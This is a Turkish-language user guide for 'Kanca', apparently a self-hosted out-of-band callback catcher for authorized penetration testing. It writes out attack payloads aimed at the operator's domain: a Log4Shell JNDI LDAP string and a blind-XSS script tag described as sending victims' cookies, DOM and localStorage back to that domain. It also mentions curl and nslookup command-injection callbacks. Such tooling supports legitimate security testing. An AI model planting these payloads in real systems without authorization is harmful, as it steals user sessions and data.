# Kanca — Kullanım Kılavuzu

Bu kılavuz, kurulu ve çalışan Kanca'yı **nasıl kullanacağını** anlatır.
(Kurulum için [README.md](README.md), mimari için [ARCHITECTURE.md](ARCHITECTURE.md).)

> ⚠️ Yalnızca sahip olduğun veya **yazılı test yetkisi aldığın** sistemlere karşı,
> eğitim ve yetkili güvenlik testi amacıyla kullan.

---

## 1. Mantık: OOB (out-of-band) nedir?

Bazı zafiyetler **doğrudan yanıt vermez.** Örneğin bir sunucu, senin verdiğin URL'e
arka planda istek atıyor olabilir (SSRF) ama sana cevabı göstermez. Ya da
gönderdiğin bir XSS payload'ı, sen göremezken bir yönetici panelinde çalışır
(blind XSS). Bunları görmenin yolu: hedefi **senin kontrolündeki bir sunucuya**
(Kanca) geri bağlanmaya zorlamak ve o bağlantıyı yakalamak.

Kanca dört "geri bağlanma" yolunu yakalar: **HTTP, DNS, SMTP, LDAP.**

Her test için bir **kanca** üretirsin. Kancanın benzersiz bir adresi olur:
`{token}.oob.dagdelean.dev`. O adrese gelen her etkileşim panelinde belirir,
AI analiz eder ve Telegram'ına bildirim düşer.

---

## 2. Panele giriş

1. Tarayıcıda **https://panel.dagdelean.dev** aç.
2. `ADMIN_TOKEN`'ını gir (kurulumda BicBic ile ürettiğin değer; `.env`'de duruyor).
3. Token tarayıcında saklanır; sunucuya sadece istek başlığında gider.

---

## 3. Kanca (hook) oluşturma

- Sol üstte bir isim yaz (ör. `acme-ssrf-testi`) → **+ Oluştur**.
- Kanca listede belirir. Üstüne tıklayınca sağda şunları görürsün:
  - **Yakalama adresi:** `https://{token}.oob.dagdelean.dev/` → hedefe bunu verirsin.
  - **DNS adı:** `{token}.oob.dagdelean.dev`
  - **🎯 Blind-XSS payloadları** ve **🧪 OOB payloadları** (hazır dizgeler).
- İsmi anlamlı ver: hangi test için olduğunu sonradan hatırlarsın.

> Her test için **ayrı kanca** aç — böylece hangi etkileşimin hangi testten
> geldiğini karıştırmazsın.

---

## 4. Dört yakalama türü ve nasıl test edilir

Aşağıda `{token}` yerine kendi kancanın token'ını koy.

### 4.1 HTTP
Hedefin senin adresine HTTP isteği atmasını beklediğin her yerde kullan
(SSRF, webhook, redirect, görsel/URL alanları).

```bash
# Kendin denemek için:
curl "https://{token}.oob.dagdelean.dev/test?kaynak=deneme"
```
Yakalama adresini hedefteki bir "URL" alanına koyarsan, hedef oraya bağlanınca
isteği (metot, yol, başlıklar, gövde, **gerçek kaynak IP**) panelde görürsün.

### 4.2 DNS
Çoğu blind durumda hedefin HTTP çıkışı engellidir ama **DNS sorgusu** yine de
dışarı çıkar. Sadece alt alanın çözülmesi bile yakalanır — en güvenilir sinyal.

```bash
dig rastgele.{token}.oob.dagdelean.dev
# veya
nslookup rastgele.{token}.oob.dagdelean.dev
```

### 4.3 SMTP (e-posta)
Hedef, senin alanına e-posta göndermeye zorlanırsa yakalanır.

```bash
# RCPT TO alanındaki alan adından token çözülür:
swaks --to test@{token}.oob.dagdelean.dev --server <hedef-smtp>
```
> **Not:** Birçok VPS sağlayıcısı spam nedeniyle **gelen 25 portunu engeller.**
> Bulutova engelliyorsa dışarıdan e-posta ulaşmayabilir (yerelde çalışır). LDAP
> ve DNS/HTTP bu kısıttan etkilenmez.

### 4.4 LDAP (Log4Shell / JNDI)
Log4Shell gibi JNDI zafiyetlerinde hedef `ldap://{token}.oob.../...` adresine
bağlanır. Hem DNS sorgusu hem LDAP bağlantısı yakalanır.

```bash
# Panel → 🧪 OOB payloadları → "Log4Shell — JNDI LDAP" dizgesini kullan:
# ${jndi:ldap://{token}.oob.dagdelean.dev/{token}}
```

---

## 5. Etkileşimleri okuma

Kancayı seçince altında etkileşimler **canlı** akar (yeni gelen anında belirir,
"Yeni istek yakalandı" uyarısı çıkar). Bir etkileşime tıklayınca açılır:

- **Protokol rozeti** (HTTP / DNS / SMTP / LDAP), yol/sorgu, kaynak IP, saat.
- **🧠 AI analizi:** risk seviyesi (INFO→CRITICAL), tespit edilen tür
  (SSRF/XSS/XXE…), kısa teknik özet. *(Groq ile; `.env`'de anahtar varsa.)*
- **Başlıklar / Query / Gövde** (HTTP) veya **İçerik** (SMTP/LDAP) —
  yakalanan veri **düz metin** olarak güvenle gösterilir (çalıştırılmaz).

Aynı anda **Telegram'ına** formatlı bir bildirim düşer (risk, tür, kaynak,
sızan veri, özet). Blind/stored payload saatler sonra tetiklense bile
telefonundan haberin olur.

---

## 6. Payload üreticileri

Her kancanın altında iki hazır üretici var; dizgeler token'ınla gömülü gelir,
"Kopyala" ile alırsın.

### 🎯 Blind-XSS
Hedefe enjekte ettiğin JS, bir kurbanın tarayıcısında çalışınca **cookie, URL,
DOM, localStorage**'ı toplayıp Kanca'ya geri gönderir (panelde yeni istek olur).
- `<script src="https://{token}.oob.dagdelean.dev/p.js"></script>` ve varyantları.
- Yorum alanı, isim alanı, destek talebi gibi "sonradan bir yönetici görür"
  yerlere koymak için idealdir.

### 🧪 OOB payloadları (yetkili test)
- **SSRF callback** — URL beklenen yere koy.
- **Log4Shell** (JNDI ldap/dns/rmi) — User-Agent, başlık, form alanlarına.
- **XXE** — XML alan/gövdelerine (OOB geri arama).
- **Komut enjeksiyonu** — `curl` ve `nslookup` (çıkış engelliyse DNS ile).

---

## 7. Uçtan uca örnek: blind SSRF testi

1. Panelde kanca aç: `acme-avatar-ssrf`.
2. Hedef uygulamada "profil fotoğrafı URL'i" alanına yakalama adresini yaz:
   `https://{token}.oob.dagdelean.dev/avatar`.
3. Kaydet. Hedef sunucu o URL'i çekmeye çalışırsa:
   - Panelde `GET /avatar` etkileşimi belirir, **kaynak IP** hedef sunucudur.
   - AI muhtemelen "SSRF / düşük-orta risk" der.
   - Telegram'a bildirim düşer.
4. Çıkış tamamen engelliyse bile `dig {token}.oob...` DNS kaydını görürsün →
   en azından sunucunun DNS çözümleyebildiğini kanıtlar.

---

## 8. Operasyon (sahibi olarak sen)

- **Sunucu:** `/opt/kanca` (VPS). Kod güncelleme:
  ```bash
  cd /opt/kanca && git pull && docker compose up -d --build
  ```
- **Veri:** `/opt/kanca/data/kanca.db` (SQLite). Yedek = bu dosyanın kopyası.
- **Sertifika:** otomatik yenilenir (haftalık cron). Elle:
  `docker compose run --rm certbot renew && docker compose restart caddy`.
- **Loglar:** `docker compose logs -f kanca` (uygulama), `.../renew.log` (sertifika).
- **AI/Telegram:** `.env`'deki `AI_*` / `TELEGRAM_*` boşsa o katman sessizce kapanır.

---

## 9. Bilinmesi gerekenler / sınırlar

- **Port 25 (SMTP)** sağlayıcıda kapalı olabilir → dışarıdan e-posta ulaşmayabilir.
- **Mock yanıtı** (özel status/header/body/gecikme) API'de var
  (`PUT /api/hooks/{token}/mock`) ama panelde düzenleme arayüzü **henüz yok**.
- **AI gizliliği:** yakalanan veri (cookie/token dahil) analiz için Groq'a (3.
  taraf) gider. Hassas angajmanlarda `.env`'de yerel modele (Ollama) geç.
- **Veri birikimi:** otomatik temizlik yok; DB zamanla büyür (ileride eklenecek).
- Panelde gösterilen HTTP yakalama adresi `https`; hedef `http` kullansa da
  ikisi de yakalanır. `{token}.oob...` tarayıcıda açılırsa `.dev` HTTPS zorlar.
